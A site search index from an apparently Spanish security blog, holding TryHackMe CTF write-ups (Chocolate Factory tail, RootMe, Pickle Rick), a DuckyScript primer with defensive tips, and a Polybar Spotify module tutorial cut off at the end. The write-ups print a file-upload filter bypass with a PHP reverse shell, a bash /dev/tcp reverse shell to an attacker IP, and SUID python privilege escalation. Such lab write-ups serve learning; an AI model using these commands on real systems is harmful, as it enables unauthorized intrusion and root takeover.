nada.\nchmod +x key_rev_key â¯ ./key_rev_key Enter your name: charlie Bad name! Al hacer un nano al archivo hay una lÃ­nea que pone:\ncongratulations you have found the key: ^@^@^@^@b\u0026#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026#39;^@` Â¡Ya tenemos la key!\nTambiÃ©n hay otra lÃ­nea en la cual se puede ver el nombre correcto\nEnter your name: \u0000%s\u0000 laksdhfas\u0000\u0000 â¯ ./key_rev_key Enter your name: laksdhfas congratulations you have found the key: b\u0026#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026#39; Keep its safe Root flag Ahora ya podemos ejecutar el root.py que estÃ¡ en /root y poner la key.\nÂ¡Nos responde con la flag de root!\n","date":"2022-12-13","id":128,"permalink":"/writeups/tryhackme/chocolate-factory/","summary":"Un ctf temÃ¡tica de Charlie y la fÃ¡brica de chocolate, vuelve a visitar la fÃ¡brica de chocolate de Willy Wonka.","tags":["CTF","FÃ¡cil","Linux","Archivos ocultos","vi","hash sha512"],"title":"Chocolate Factory"},{"content":"","date":"2022-12-13","id":129,"permalink":"/tags/hash-sha512/","summary":"","tags":[],"title":"hash sha512"},{"content":"","date":"2022-12-13","id":130,"permalink":"/tags/vi/","summary":"","tags":[],"title":"vi"},{"content":"Un ctf para principiantes, me puedes rootear?\nhttps://tryhackme.com/room/rrootme\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.108.243\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.108.243 PING 10.10.108.243 (10.10.108.243) 56(84) bytes of data. 64 bytes from 10.10.108.243: icmp_seq=1 ttl=63 time=77.9 ms --- 10.10.108.243 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 77.935/77.935/77.935/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.108.243 -oG allPort ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPort â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.108.243 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p22,80 -sC -sV 10.10.108.243 -oN target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4ab916884c25448ba5cfd3f2252214 (RSA) | 256 a9a686e8ec963f003cd16d54973082 (ECDSA) |_ 256 22f6b5a654d9787c26035a953f9dfcd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HackIT - Home | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Web Con el whateb podemos ver info sobre a web\nâ¯ whatweb 10.10.108.243 http://10.10.108.243 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.108.243], Script, Title[HackIT - Home] Al entrar a la web solo se ve texto\nBuscando subdirectorios (wfuzz) Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que estÃ¡ en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.108.243/FUZZ ParÃ¡metro FunciÃ³n -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no nos reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario El wfuzz nos reporta lo siguiente\n===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000550: 301 9 L 28 W 312 Ch \u0026#34;css\u0026#34; 000000953: 301 9 L 28 W 311 Ch \u0026#34;js\u0026#34; 000005520: 301 9 L 28 W 314 Ch \u0026#34;panel\u0026#34; 000000164: 301 9 L 28 W 316 Ch \u0026#34;uploads\u0026#34; 000095524: 403 9 L 28 W 278 Ch \u0026#34;server-status\u0026#34; Al entrar al /panel se ve un sitio para subir archivos\nProbamos con subir una foto random, y vemos que aparece en el /uploads\nVulnerabilidad web Viendo esto vamos a intentar subir un archivo .php para crear una reverse shell, este archivo es de pentestmonkey https://github.com/pentestmonkey/php-reverse-shell\nPrimero lo pasamos a nuestra mÃ¡quina\ngit clone https://github.com/pentestmonkey/php-reverse-shell DespuÃ©s nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Y ahora lo subimos el archivo a /panel\nÂ¡Error!\nNo acepta archivos php, Los administradores pueden hacer una lista negra de extensiones de archivos especÃ­ficas y evitar que los usuarios carguen archivos con extensiones que se consideran peligrosas. Esto se puede omitir mediante el uso de extensiones alternativas o incluso no relacionadas.\nEjemplo extensiones php \u0026mdash;\u0026gt; .phtml, .php3, .php4, .php5\nVamos a probar con la primera (.phtml), le cambiamos el nombre al archivo, de php-reverse-shell.php a php-reverse-shell.phtml\nAhora ya le gusta\nDesde /uploads le damos al archivo que hemos subido y recibimos una conexiÃ³n\nâ¯ nc -nlvp 443 listening on [any] 443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.108.243] 37418 Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 13:52:50 up 48 min, 0 users, load average: 0.00, 0.00, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ Tratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Flags En /var/wwwesta la primera flag user.txt\nLa flag de root estÃ¡ en el /root, pero no tenemos permisos para acceder, Con el comando history, se pueden ver dos comandos interesantes\u0026hellip;\n10 find / -perm /4000 11 python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; El comando find / -perm /4000 lo que hace es buscar todos los programas con permiso SUID, en este caso python tiene permiso SUID\nÂ¿QuÃ© es el permiso SUID?\nHay veces que es necesario que un programa se ejecute con los privilegios de su propietario en lugar de con los privilegios del usuario que lo ejecuta. Un ejemplo es el comando passwd, el cual necesita tener privilegios de root, ya que tiene que acceder a los ficheros /etc/passwd o /etc/shadow en modo escritura. Estos programas constituyen un peligro potencial en un sistema, ya que si se hace un mal uso de ellos y el propietario tiene privilegios, root, el que lo ejecuta podrÃ¡ hacer en el sistema todo lo que el propietario del programa tenga permitido.\nEl comando python -c 'import os; os.execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, \u0026quot;-p\u0026quot;)' lo que hace es spawnear una bash y como python se ejecuta como root, la bash que spawnea es como root\nAhora ya podemos ver la flag con cat /root/root.txt\n","date":"2022-12-11","id":131,"permalink":"/writeups/tryhackme/rootme/","summary":"Un ctf para principiantes, me puedes rootear?\nhttps://tryhackme.com/room/rrootme\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.108.243\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","python","file upload"],"title":"RootMe"},{"content":"Un CTF de Rick y Morty. Â¡Ayuda a que Rick vuelva a ser humano!\nhttps://tryhackme.com/room/picklerick\nEste desafÃ­o temÃ¡tico de Rick y Morty requiere explotar un servidor web para encontrar 3 ingredientes que ayudarÃ¡n a Rick a hacer su pociÃ³n para transformarse de nuevo en un ser humano a partir de un pepinillo.\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.26.25\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.26.25 PING 10.10.26.25 (10.10.26.25) 56(84) bytes of data. 64 bytes from 10.10.26.25: icmp_seq=1 ttl=63 time=63.6 ms --- 10.10.26.25 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 63.615/63.615/63.615/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.26.25 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPorts Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.26.25 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p22,80 -sC -sV 10.10.11.105 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d1ed3a0a8738271e3eafc898ea5b27 (RSA) | 256 7396d9e64c6a499612a1b46f571db2 (ECDSA) |_ 256 669f61effb12c69123cbc6280a5d1a (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Rick is sup4r cool ParÃ¡metro FunciÃ³n -p22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos De momento no hay nada raro\u0026hellip;\nReconocimiento web Al entrar a la web lo primero que se ve es lo siguiente\nEl texto traducido al espaÃ±ol es:\nAyuda Morty!\nEscucha Morty\u0026hellip; Necesito tu ayuda, me he vuelto a convertir en un pepinillo y esta vez no puedo volver a cambiar.\nNecesito que BURRRP \u0026hellip;.Morty, inicia sesiÃ³n en mi computadora y encuentra los Ãºltimos tres ingredientes secretos para terminar mi pociÃ³n de pepinillo inverso. Â¡El Ãºnico problema es que no tengo idea de cuÃ¡l era la contraseÃ±a BURRRRRRRRP ! Â¡Ayuda Morty, ayuda!\nCon control + u se puede ver si hay algo en el codigo de la web.\nEn una lÃ­nea se puede ver un comentario que contiene el nombre de un usuario\n\u0026lt;!-- Note to self, remember username! Username: R1ckRul3s --\u0026gt; Buscando subdirectorios Para buscar subdirectorios e intentado con wfuzz (wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.170:8080/FUZZ) y con gobuster (gobuster -u 10.10.43.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir) pero tardaban mucho. Asi que probe con un script de nmap llamado http-enum\nâ¯ nmap -p80 --script=http-enum 10.10.43.4 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 01:05 CET Nmap scan report for 10.10.43.4 Host is up (0.064s latency). PORT STATE SERVICE 80/tcp open http | http-enum: | /login.php: Possible admin folder |_ /robots.txt: Robots file Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds El nmap reporta 2: robots.txt y login.php\nrobots.txt Al entrar a robots.txt solo se ve una frase Wubbalubbadubdub\nlogin.php Al entrar a login.php hay un panel para iniciar sesiÃ³n, al poner el usuario del principio y la frase del robots.txt de contraseÃ±a se abre una pÃ¡gina llamada portal.php que hay varias secciones, pero hay una que se llama commands en la cual se pueden ejecutar comandos\nInfiltraciÃ³n Vamos a intentar crear una reverse shell mediante esa ejecuciÃ³n de comandos.\nnc -nlvp 443 Para ponernos en escucha por el puerto 443\nAhora desde de la web vamos a intentar ejecutar lo siguiente:\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1 443 = Puerto en el que estamos en escucha 10.10.10.10 = Ip de nuestra mÃ¡quina\nPero no recibimos nada\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; Ahora si ya tenemos la reverse shell.\nTratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm \u0026ldquo;Flags\u0026rdquo; Para resolver la mÃ¡quina necesitamos saber los tres ingredientes.\nEl primero lo encontramos en el directorio /var/www/html en un archivo llamado Sup3rS3cretPickl3Ingred.txt El segundo estÃ¡ en /home/rick en un archivo llamado second ingredients El Ãºltimo estÃ¡ en el directorio /root, pero no tenemos acceso, al probar con un sudo su, no pide la contraseÃ±a y ya podemos visualizar el Ãºltimo ingrediente que estÃ¡ en un archivo llamado 3rd.txt ","date":"2022-12-10","id":132,"permalink":"/writeups/tryhackme/pickle-rick/","summary":"Un CTF de Rick y Morty. Â¡Ayuda a que Rick vuelva a ser humano!\nhttps://tryhackme.com/room/picklerick\nEste desafÃ­o temÃ¡tico de Rick y Morty requiere explotar un servidor web para encontrar 3 ingredientes que ayudarÃ¡n a Rick a hacer su pociÃ³n para transformarse de nuevo en un ser humano a partir de un pepinillo.","tags":["CTF","FÃ¡cil","Linux"],"title":"Pickle Rick"},{"content":"Â¿QuÃ© es un USB Rubber Ducky? Rubber ducky es un pendrive con unas caracterÃ­sticas especiales, a diferencia de un pendrive normal en el que puedes guardar archivos, fotos, etc. El Rubber Ducky, es un dispositivo que inyecta pulsaciones de teclas previamente definidas. Fue desarrollado por hak5 y se puede conseguir desde su web actualmente por $79.99.\nLo que lo hace tan peligroso es que los antivirus no lo detectan, porque los ordenadores lo interpretan como un teclado.\nEl Rubber ducky ha salido en alguna serie como por ejemplo Mr.Robot.\n(Escena mr.robot)\nÂ¿Como usarlo? Lo primero es sacar la tarjeta micro sd que hay en su interior y meterla en el adaptador, para conectarlo al ordenador Ahora toca crear los scripts para indicarle que es lo que tiene que hacer en cada momento. Para ello se usa el lenguaje de programaciÃ³n Duckyscript DuckyScript Es un lenguaje muy sencillo que se puede usar desde cualquier editor de texto. AdemÃ¡s sirve para mÃ¡s dispositivos de hak5 como por ejemplo:\nDuckyScriptâ„¢ Version Device Compatibility 1.0 Original USB Rubber Ducky (USB-A Only) 2.x Bash Bunny, Key Croc, Packet Squirrel, LAN turtle, Shark Jack, O.M.G Devices 3.0 New USB Rubber Ducky (USB-A \u0026amp; USB-C) REM (Comentarios) Para hacer comentarios se usa REM\nREM Esto no se va a interpretar DELAY El comando DELAY Ã­ndica al USB que se pare momentÃ¡neamente, esto es Ãºtil para scripts que por ejemplo abren una ventana o una aplicaciÃ³n y tiene que esperar a que cargue\nDELAY 1000 STRING STRING sirve para que escriba una frase o palabra, el usb automÃ¡ticamente aprieta el shift en las mayÃºsculas y la barra espaciadora para los espacios, pero no interpreta los espacios finales\nSTRING Hello world! Lo que escribirÃ¡ el RubberDucky\nHello world! STRINGLN Es como el string pero al final hace un enter\nTeclas movimiento Se pueden usar para desplazarse por una ventana o aplicaciÃ³n.\nUP DOWN LEFT RIGHT UPARROW DOWNARROW LEFTARROW RIGHTARROW PAGEUP PAGEDOWN HOME END INSERT DELETE DEL BACKSPACE TAB SPACE Teclas del sistema Son utilizadas principalmente por el sistema operativo para funciones especiales y pueden usarse para interactuar con Ã¡reas de texto y navegar por la interfaz de usuario.\nENTER ESCAPE PAUSE BREAK PRINTSCREEN MENU APP F1 F2 F3 F4 F5 F6 F7 F8 F9 F0 F11 F12 Teclas de modificaciÃ³n BÃ¡sicas Son teclas que se combinan con otra tecla para realizar una funciÃ³n especial\nSHIFT ALT CONTROL CTRL COMMAND WINDOWS GUI REM Ejemplo de teclas de modificaciÃ³n REM Windows Run GUI r REM Cerrar Ventana ALT F4 REM Pegar CTRL c Avanzadas Se pueden combinar entre ellas\nCTRL SHIFT ALT SHIFT COMMAND CTRL COMMAND CTRL SHIFT COMMAND OPTION COMMAND OPTION SHIFT CONTROL ALT DELETE Independientes Para pulsar una tecla modificadora sola se tiene que poner antes INJECT_MOD\nREM Ejemplo presionando la tecla de Windows sola INJECT_MOD WINDOWS Teclas de Bloqueo Las teclas de bloqueo alternan entre activado y desactivado\nCAPSLOCK NUMLOCK SCROLLOCK BotÃ³n Dentro del Rubber Ducky hay un pequeÃ±o botÃ³n el cual se puede combinar con los scripts, por defecto, al pulsarlo reinicia el script que tiene cargado, pero se puede modificar su funciÃ³n:\nWAIT_FOR_BUTTON_PRESS Sirve para pausar el script hasta que se presione el botÃ³n\nREM Ejemplo uso de WAIT_FOR_BUTTON_PRESS STRING Hello World! WAIT_FOR_BUTTON_PRESS STRING Has presionado el botÃ³n... BUTTON_DEF Define una funciÃ³n que se ejecutarÃ¡ cuando se presione el botÃ³n en cualquier momento dentro del script, siempre que el botÃ³n no estÃ© ya en uso por el comando WAIT_FOR_BUTTON_PRESS u otra funciÃ³n similar.\nBUTTON_DEF STRING Has presionado el botÃ³n. END_BUTTON DISABLE_BUTTON y ENABLE_BUTTON Como su propio nombre indica, sirve para desactivar y activar el botÃ³n.\nDISABLE_BUTTON REM BotÃ³n desactivado ENABLE_BUTTON REM BotÃ³n activado LED El Ruber Ducky En su interior tiene un pequeÃ±o LED el cual se puede controlar en los scripts\nLED_OFF Apaga el led\nLED_R PondrÃ¡ el led rojo\nLED_G PondrÃ¡ el led verde\nÂ¿DÃ³nde Programarlo? En el apartado de soporte del RubberDucky se puede descargar un JSEncoder, es un archivo con extension .html. En linux se abre con firefox jsencoder.html y en windows: click derecho, abrir con, navegador\nCambiar idioma de los scripts El Rubber Ducky tiene la distribuciÃ³n de teclado inglÃ©s por defecto, para poder cambiarlo hay que descargar el idioma deseado desde https://github.com/hak5/usbrubberducky-payloads/tree/master/languages para despuÃ©s ponerlo en el jsencoder\nPrimer hola mundo Para que el Rubber Ducky haga un hola mundo, hay que poner en el jsencoder lo sieguiente:\nDELAY 200 STRING Hola Mundo!!! Ahora solo hace falta clicar a generate payload y se descargarÃ¡ un archivo llamado inject.bin, el cual se tiene que poner en la tarjeta micro sd (solo puede haber un inject.bin, (borra los antiguos).\nComo protegerse Lo primero y mÃ¡s obvio es no dejarte ordenadores, mÃ³viles, impresoras, etc\u0026hellip; desbloqueados.\nExiste un programa para windows que se queda corriendo en segundo plano y te protege de el Rubber ducky y dispositivos similares. No lo e probado pero por lo que e visto por internet, cuando detecta el RubberDucky lo para, bloquea el ordenador y guarda todas las pulsaciones de teclado del RubberDucky para ver las intenciones del atacante\nhttps://lospi.net/beamgun/\n","date":"2022-12-05","id":133,"permalink":"/blog/cuidado-con-este-usb/","summary":"Rubber ducky es un pendrive con unas caracterÃ­sticas especiales, a diferencia de un pendrive normal en el que puedes guardar archivos, fotos, etc. El Rubber Ducky, es un dispositivo que inyecta pulsaciones de teclas previamente definidas.","tags":["USB","hak5"],"title":"Â¡Cuidado con este USB!"},{"content":"Â¿QuÃ© es? Es un simple mÃ³dulo para la polybar que muestra que canciÃ³n se estÃ¡ reproduciendo y se pueden aÃ±adir botones para pausar y pasar canciones.\nÂ¿Como aÃ±adirlo a la polybar? Para aÃ±adirlo a la polybar se tienen que seguir los siguientes dos pasos: irte al archivo donde tengas los mÃ³dulos de la polybar, en mi caso ~/.config/polybar/modules.ini, y abajo del todo copiar lo siguiente\nMÃ³dulos MÃ³dulo Song AÃ±Ã¡delo si quieres que salga la canciÃ³n que se estÃ  reproduciendo\u0026hellip; [module/song] type = custom/script exec = ~/.config/bin/song.sh interval = 1 format-prefix = \u0026#34;ï†¼ \u0026#34; format = \u0026lt;label\u0026gt; MÃ³dulo Previous AÃ±Ã¡delo si quieres tener el botÃ³n para reproducir la canciÃ³n anterior [module/previous] type = custom/script exec = ~/.config/bin/previous.sh interval = 1 ;format-prefix = \u0026#34;ï†¼ \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.Previous MÃ³dulo Next AÃ±Ã¡delo si quieres tener el botÃ³n para reproducir la canciÃ³n siguiente [module/next] type = custom/script exec = ~/.config/bin/next.sh interval = 1 ;format-prefix = \u0026#34;ï†¼ \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.Next MÃ³dulo Play AÃ±Ã¡delo si quieres tener el botÃ³n para parar y reproducir una canciÃ³n [module/play] type = custom/script exec = ~/.config/bin/play.sh interval = 1 ;format-prefix = \u0026#34;ï†¼ \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.PlayPause Archivos Para que los mÃ³dulos funcionen hay que poner los siguientes archivos en la carpeta ~/.config/bin/ Â¡AcuÃ©rdate de darle permisos de ejecuciÃ³n a todos con chmod +x!\nsong.sh Contenido del archivo song.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then artist=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/artist/{getline; getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) song=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/title/{getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) echo $song - $artist else echo \u0026#34;\u0026#34; fi next.sh Contenido del archivo next.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;î§™\u0026#34; else echo \u0026#34;\u0026#34; fi previous.sh Contenido del archivo previous.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;î§˜\u0026#34; else echo \u0026#34;\u0026#34; fi play.sh Contenido del archivo play.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;î¦»\u0026#34; else echo \u0026#34;\u0026#34; fi Â¡Novedad Animated Song! Algunas personas que usaron estos mÃ³dulos me comentaron que al escuchar canciones muy largas, les ocupaba mucho espacio en la polybar, por eso hice con la ayuda de b3nder0n el siguiente script, que bÃ¡sicamente lo que hace es animar el texto de la canciÃ³n para que solo ocupe x caracteres previamente definidos\u0026hellip;\nConfiguraciÃ³n Para su configuraciÃ³n es casi igual que los otros mÃ³dulos, los pasos son los siguientes\nArchivos Para su correcto funcionamiento hay que crear los siguientes archivos ~/.config/bin/ y no te olvides de darles permiso de ejecuciÃ³n con chmod\nanimated.sh Contenido del animated.sh #!/bin/bash lenght=15 if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then artist=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/artist/{getline; getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) song=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/title/{getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) text=\u0026#34;ï§† $song - $artist \u0026#34; num_char=$(echo -n $text | wc -c) text2=${text// /#} if [[ $lenght \u0026lt; $num_char ]];then letter=$(cat ~/.config/bin/progress.txt) times=0 result=() for (( i=0 ; i \u0026lt; ${#text} ; i++ )) { a[$i]=${text2:i:1} } until [ $lenght -lt $times ]; do letter=$(($letter + 1)) times=$(($times + 1)) if [[ $letter -lt $num_char ]]; then result+=(${a[$letter]}) else letter=-1 fi done echo $(($letter - $times + 1)) \u0026gt; ~/.config/bin/progress.txt echo ${result[@]} | tr -d \u0026#34; \u0026#34; | tr \u0026#34;#\u0026#34; \u0026#34; \u0026#34; else echo $text fi else echo \u0026#34;\u0026#34; fi progress.txt Hace falta crear un archivo llamado progress.txt, tambien en ~/.config/bin/ MÃ³dulo Para su correcto funcionamiento hay que aÃ±adirlo abajo del todo en el archivo de mÃ³dulos de la polybar, en mi caso ~/.config/polybar/modules.ini y despuÃ©s activarlo en el config.ini\n[module/animated-song] type = custom/script exec = ~/.config/bin/animated.sh interval = 1 format = \u0026lt;label\u0026gt; Para graduar la velocidad se tiene que cambiar el valor de interval, el nÃºmero de interval equivale a la velocidad por carÃ¡cter.\nPara modificar el mÃ¡ximo de caracteres se tiene que especificar en la variable lenght del 